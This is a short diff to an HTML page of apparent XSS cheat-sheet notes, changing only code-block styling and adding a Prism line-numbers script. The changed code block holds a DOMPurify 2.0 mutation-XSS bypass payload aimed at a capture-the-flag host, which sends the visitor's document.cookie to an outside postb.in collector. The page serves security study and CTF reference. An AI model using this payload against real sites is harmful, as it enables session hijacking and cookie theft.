@@ -280,7 +280,7 @@
 <p>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p>
 <h2 id="dompurify-20-bypass">DOMPurify 2.0 bypass</h2>
 <p>https://research.securitum.com/dompurify-bypass-using-mxss/</p>
-<pre><code>http://qual-challs.rtfm.re:8080/?layout=&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a%20id=&quot;&lt;/style&gt;&lt;style&gt;%40keyframes%20slidein%20%7B%7D&lt;%2Fstyle&gt;&lt;a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie&gt;&lt;%2Fa&gt;%20&quot;&gt;
+<pre><code class="language-none line-numbers">http://qual-challs.rtfm.re:8080/?layout=&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a%20id=&quot;&lt;/style&gt;&lt;style&gt;%40keyframes%20slidein%20%7B%7D&lt;%2Fstyle&gt;&lt;a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie&gt;&lt;%2Fa&gt;%20&quot;&gt;
 </code></pre>
             
           </div>
@@ -310,6 +310,7 @@
     <script>var base_url = '..';</script>
     <script src="../js/theme.js"></script>
     <script src="../js/prism-core.min.js"></script>
+    <script src="../js/prism-line-numbers.min.js"></script>
     <script src="../js/prism-clike.min.js"></script>
     <script src="../js/prism-yaml.min.js"></script>
     <script src="../js/prism-powershell.min.js"></script>
